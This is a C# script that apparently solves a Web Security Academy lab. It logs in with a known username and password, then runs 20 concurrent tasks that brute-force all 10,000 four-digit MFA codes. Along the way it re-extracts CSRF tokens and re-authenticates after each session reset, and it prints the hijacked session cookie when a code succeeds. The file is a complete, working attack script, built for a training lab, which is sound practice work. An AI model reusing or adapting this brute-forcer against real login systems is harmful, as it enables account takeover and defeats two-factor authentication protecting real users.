using System.Collections.Concurrent;
using System.Net;
using System.Net.Http;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks.Dataflow;

// ANSI escape codes
const string
    R = "\x1b[31m", // Red
    G = "\x1b[32m", // Green
    Y = "\x1b[33m", // Yellow
    RESET = "\x1b[0m";

string FindCsrf(string content) {
    var match = Regex.Match(content, @"name=""csrf"" value=""(\w+)""");
    if (!match.Success)
        throw new Exception("Failed to find CSRF token.");
    return match.Groups[1].Value;
}

if (Args.Count < 1) {
    WriteLine($"{R}No lab ID specified.{RESET}");
    return;
}

if (!Regex.IsMatch(Args[0], @"^[0-9a-f]{32}$")) {
    WriteLine($"{R}Invalid lab ID, must be a 32-char hex string.{RESET}");
    return;
}

readonly string LabId = Args[0];
readonly string LabHost = $"{LabId}.web-security-academy.net";
readonly string LabUrl = $"https://{LabHost}";

const int Width = 16;

readonly var cts = new CancellationTokenSource();

async Task ProcessCodesAsync(int taskNumber, ISourceBlock<int> mfaCodes, CancellationToken ct) {
    string taskName = $"Task {taskNumber,3}";
    WriteLine($"{taskName,Width} :: Launched");
    var cookies = new CookieContainer();
    var handler = new HttpClientHandler {
        AllowAutoRedirect = false,
        CookieContainer = cookies
    };
    var http = new HttpClient(handler) {
        BaseAddress = new Uri(LabUrl)
    };

    var loginData = new Dictionary<string, string>() {
        ["username"] = "carlos",
        ["password"] = "montoya"
    };

    // Obtain initial CSRF token
    WriteLine($"{taskName,Width} :: Obtaining CSRF token");
    var res = await http.GetAsync("/login", ct);
    string csrf = FindCsrf(await res.Content.ReadAsStringAsync(ct));
    bool loginRequired = true;

    try {
        while (!ct.IsCancellationRequested) {
            if (loginRequired) {
                loginData["csrf"] = csrf;
                res = await http.PostAsync("/login", new FormUrlEncodedContent(loginData), ct);
                if (res.StatusCode != HttpStatusCode.Redirect) {
                    res.EnsureSuccessStatusCode();
                    return;
                }
                res = await http.GetAsync("/login2", ct);
                csrf = FindCsrf(await res.Content.ReadAsStringAsync(ct));
                loginRequired = false;
            }
            int code = await mfaCodes.ReceiveAsync(ct);
            // Post mfa-code
            res = await http.PostAsync("/login2", new FormUrlEncodedContent(new Dictionary<string, string>() {
                ["csrf"] = csrf,
                ["mfa-code"] = $"{code:D4}"
            }), ct);
            // Login successful
            if (res.StatusCode == HttpStatusCode.Redirect) {
                mfaCodes.Complete();
                cts.Cancel();
                WriteLine($"{taskName,Width} :: {code:D4} -> {G}OK{RESET}");
                var sessionCookie = cookies.GetCookies(new Uri(LabUrl))["session"];
                WriteLine($"{"Session",Width} :: {G}{sessionCookie.Value}{RESET}");
                await http.GetAsync("/my-account");
            } else if (res.StatusCode == HttpStatusCode.OK) {
                WriteLine($"{taskName,Width} :: {code:D4} -> {Y}Invalid{RESET}");
                csrf = FindCsrf(await res.Content.ReadAsStringAsync(ct));
                loginRequired = res.Headers.Contains("Set-Cookie");
            } else {
                throw new HttpRequestException($"{(int)res.StatusCode} {res.ReasonPhrase}");
            }
        }
    }
    catch (HttpRequestException ex) {
        // Throw if status code is in the 5xx range
        if (((int)ex.StatusCode / 100) == 5)
            throw ex;
    }
    catch (Exception ex) when (!ct.IsCancellationRequested) {
        WriteLine($"{taskName,Width} :: {R}Failed: {ex.Message}{RESET}");
    }
}

// Check lab status
Write($"{"Lab status",Width} :: ");
var res = await new HttpClient().GetAsync(LabUrl);
if (res.StatusCode != HttpStatusCode.OK) {
    WriteLine($"{R}{(int)res.StatusCode} {res.ReasonPhrase}{RESET}");
    return;
}
WriteLine($"{G}OK{RESET}");
await Task.Delay(1000);

var mfaCodes = new BufferBlock<int>();
for (int i = 0; i < 10000; i++)
    mfaCodes.Post(i);

var tasks = new List<Task>();
for (int i = 0; i < 20; i++)
    tasks.Add(ProcessCodesAsync(i+1, mfaCodes, cts.Token));

try { await Task.WhenAll(tasks); }
catch (TaskCanceledException) { }

if (!cts.IsCancellationRequested) {
    WriteLine($"{R}All tasks failed.{RESET}");
}